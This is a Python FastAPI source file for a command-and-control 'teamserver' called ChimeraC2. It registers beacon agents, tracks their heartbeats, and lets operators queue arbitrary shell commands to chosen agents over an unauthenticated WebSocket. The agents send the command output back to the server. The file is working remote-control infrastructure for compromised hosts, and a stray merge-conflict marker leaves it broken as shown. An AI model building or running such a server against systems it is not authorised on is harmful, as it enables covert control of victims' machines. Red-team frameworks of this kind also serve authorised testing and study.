import asyncio
import uuid
import datetime
import base64

from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from typing import Dict, List

from .db import (
    init_db,
    upsert_agent,
    create_task,
    mark_task_running,
    complete_task,
    get_tasks_for_agent,
    get_connection,
    add_audit_log,
    get_audit_logs,
)


app = FastAPI(
    title="ChimeraC2 Teamserver",
    version="1.0.0",
)


app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.get("/health")
def health():
    return {"status": "ok"}


# ============================================================
# Configuration
# ============================================================

AGENT_TIMEOUT = 15


# ============================================================
# In-memory real-time state
# ============================================================

>>>>>>> main
connected_agents: Dict[str, dict] = {}

task_queues: Dict[str, List[dict]] = {}

active_operators: List[WebSocket] = []


# ============================================================
# Helpers
# ============================================================

def utc_now():
    return datetime.datetime.now(
        datetime.timezone.utc
    ).isoformat()


# ============================================================
# WebSocket Connection Manager
# ============================================================

class ConnectionManager:

    async def connect(self, websocket: WebSocket):
        await websocket.accept()

        if websocket not in active_operators:
            active_operators.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in active_operators:
            active_operators.remove(websocket)

    async def broadcast(self, message: dict):

        for connection in active_operators.copy():

            try:
                await connection.send_json(message)

            except Exception:
                self.disconnect(connection)


manager = ConnectionManager()


# ============================================================
# Startup
# ============================================================

@app.on_event("startup")
async def startup_event():

    init_db()

    asyncio.create_task(
        monitor_agents()
    )


# ============================================================
# Agent Registration
# ============================================================

@app.post("/api/v1/beacon/register")
async def register_agent(payload: dict):

    agent_id = payload.get("agent_id")

    if not agent_id:
        return {
            "status": "error",
            "message": "agent_id is required",
        }

    now = utc_now()

    payload["last_seen"] = now
    payload["status"] = "online"

    connected_agents[agent_id] = payload

    if agent_id not in task_queues:
        task_queues[agent_id] = []

    # Persist agent.
    upsert_agent(payload)

    # Audit registration.
    add_audit_log(
        event_type="AGENT_REGISTERED",
        agent_id=agent_id,
        message=f"Agent {agent_id} registered",
    )

    await manager.broadcast({
        "type": "AGENT_REGISTER",
        "agent": payload,
    })

    return {
        "status": "registered",
        "agent_id": agent_id,
    }


# ============================================================
# Agent Poll / Heartbeat
# ============================================================

@app.post("/api/v1/beacon/poll")
async def poll_tasks(payload: dict):

    agent_id = payload.get("agent_id")

    if not agent_id:
        return {
            "task": None,
            "error": "agent_id is required",
        }

    if agent_id not in connected_agents:
        return {
            "task": None,
            "error": "unknown agent_id",
        }

    now = utc_now()

    agent = connected_agents[agent_id]

    previous_status = agent.get(
        "status",
        "offline",
    )

    agent["last_seen"] = now
    agent["status"] = "online"

    # Persist heartbeat.
    upsert_agent(agent)

    await manager.broadcast({
        "type": "AGENT_HEARTBEAT",
        "agent_id": agent_id,
        "ts": now,
        "status": "online",
    })

    # Agent came back online.
    if previous_status == "offline":

        add_audit_log(
            event_type="AGENT_ONLINE",
            agent_id=agent_id,
            message=f"Agent {agent_id} came back online",
        )

        await manager.broadcast({
            "type": "AGENT_REGISTER",
            "agent": agent,
        })

    # --------------------------------------------------------
    # Deliver queued task
    # --------------------------------------------------------

    if task_queues.get(agent_id):

        task = task_queues[agent_id].pop(0)

        mark_task_running(
            task["task_id"]
        )

        # Audit task running.
        add_audit_log(
            event_type="TASK_RUNNING",
            agent_id=agent_id,
            task_id=task["task_id"],
            message=(
                f"Task {task['task_id']} "
                f"started running"
            ),
        )

        return {
            "task": task,
        }

    return {
        "task": None,
    }


# ============================================================
# Task Result
# ============================================================

@app.post("/api/v1/beacon/result")
async def receive_result(payload: dict):

    agent_id = payload.get("agent_id")

    task_id = payload.get("task_id")

    output = payload.get(
        "output",
        "",
    )

    exit_code = payload.get(
        "exit_code",
        -1,
    )

    # Decode Base64 when applicable.
    try:

        decoded_output = base64.b64decode(
            output,
            validate=True,
        ).decode("utf-8")

    except Exception:

        decoded_output = output

    payload["decoded_output"] = decoded_output

    # --------------------------------------------------------
    # Persist task result
    # --------------------------------------------------------

    if task_id:

        complete_task(
            task_id=task_id,
            output=decoded_output,
            exit_code=exit_code,
        )

        if exit_code == 0:
            event_type = "TASK_COMPLETED"
        else:
            event_type = "TASK_FAILED"

        add_audit_log(
            event_type=event_type,
            agent_id=agent_id,
            task_id=task_id,
            message=(
                f"Task {task_id} finished "
                f"with exit code {exit_code}"
            ),
        )

    # --------------------------------------------------------
    # Keep agent online
    # --------------------------------------------------------

    if agent_id in connected_agents:

        now = utc_now()

        connected_agents[agent_id]["last_seen"] = now
        connected_agents[agent_id]["status"] = "online"

        upsert_agent(
            connected_agents[agent_id]
        )

    await manager.broadcast({
        "type": "TASK_RESULT",
        "result": payload,
    })

    return {
        "status": "accepted",
    }


# ============================================================
# Task History API
# ============================================================

@app.get("/api/v1/tasks")
async def get_task_history(
    agent_id: str | None = None,
):

    if agent_id:

        tasks = get_tasks_for_agent(
            agent_id
        )

    else:

        conn = get_connection()

        rows = conn.execute(
            """
            SELECT *
            FROM tasks
            ORDER BY created_at DESC
            """
        ).fetchall()

        conn.close()

        tasks = [
            dict(row)
            for row in rows
        ]

    return {
        "count": len(tasks),
        "tasks": tasks,
    }


# ============================================================
# Audit History API
# ============================================================

@app.get("/api/v1/audit")
async def audit_history(
    agent_id: str | None = None,
    task_id: str | None = None,
    limit: int = 100,
):

    # Prevent excessively large responses.
    limit = max(
        1,
        min(limit, 500),
    )

    logs = get_audit_logs(
        agent_id=agent_id,
        task_id=task_id,
        limit=limit,
    )

    return {
        "count": len(logs),
        "logs": logs,
    }


# ============================================================
# Agent Offline Monitor
# ============================================================

async def monitor_agents():

    while True:

        await asyncio.sleep(5)

        now = datetime.datetime.now(
            datetime.timezone.utc
        )

        for agent_id, agent in connected_agents.items():

            last_seen_string = agent.get(
                "last_seen"
            )

            if not last_seen_string:
                continue

            try:

                last_seen = datetime.datetime.fromisoformat(
                    last_seen_string
                )

                if last_seen.tzinfo is None:

                    last_seen = last_seen.replace(
                        tzinfo=datetime.timezone.utc
                    )

                age = (
                    now - last_seen
                ).total_seconds()

            except Exception:

                continue

            # ------------------------------------------------
            # Agent became offline
            # ------------------------------------------------

            if (
                age > AGENT_TIMEOUT
                and agent.get("status") != "offline"
            ):

                agent["status"] = "offline"

                add_audit_log(
                    event_type="AGENT_OFFLINE",
                    agent_id=agent_id,
                    message=(
                        f"Agent {agent_id} "
                        f"went offline"
                    ),
                )

                await manager.broadcast({
                    "type": "AGENT_DISCONNECT",
                    "agent_id": agent_id,
                    "ts": utc_now(),
                    "status": "offline",
                })


# ============================================================
# Operator WebSocket
# ============================================================

@app.websocket("/ws/operator")
async def operator_websocket(
    websocket: WebSocket
):

    await manager.connect(websocket)

    try:

        # ----------------------------------------------------
        # Send current fleet
        # ----------------------------------------------------

        for agent in connected_agents.values():

            await websocket.send_json({
                "type": "AGENT_REGISTER",
                "agent": agent,
            })

        # ----------------------------------------------------
        # Operator messages
        # ----------------------------------------------------

        while True:

            data = await websocket.receive_json()

            if data.get("action") != "exec":
                continue

            t_agent = data.get(
                "agent_id"
            )

            command = data.get(
                "command"
            )

            if not t_agent or not command:

                await websocket.send_json({
                    "type": "ERROR",
                    "message": (
                        "agent_id and command "
                        "are required"
                    ),
                })

                continue

            if t_agent not in task_queues:

                await websocket.send_json({
                    "type": "ERROR",
                    "message": "Unknown agent_id",
                    "agent_id": t_agent,
                })

                continue

            # ------------------------------------------------
            # Generate task ID
            # ------------------------------------------------

            t_id = (
                f"task-"
                f"{uuid.uuid4().hex[:6]}"
            )

            new_task = {
                "task_id": t_id,
                "command": command,
            }

            # ------------------------------------------------
            # Persist task
            # ------------------------------------------------

            create_task(
                task_id=t_id,
                agent_id=t_agent,
                command=command,
            )

            # ------------------------------------------------
            # Audit task creation
            # ------------------------------------------------

            add_audit_log(
                event_type="TASK_CREATED",
                agent_id=t_agent,
                task_id=t_id,
                message=(
                    f"Task {t_id} created "
                    f"for agent {t_agent}"
                ),
            )

            # ------------------------------------------------
            # Add to real-time queue
            # ------------------------------------------------

            task_queues[t_agent].append(
                new_task
            )

            await manager.broadcast({
                "type": "TASK_QUEUED",
                "task_id": t_id,
                "agent_id": t_agent,
                "command": command,
            })

    except WebSocketDisconnect:
        manager.disconnect(websocket)

    except Exception:

        manager.disconnect(websocket)
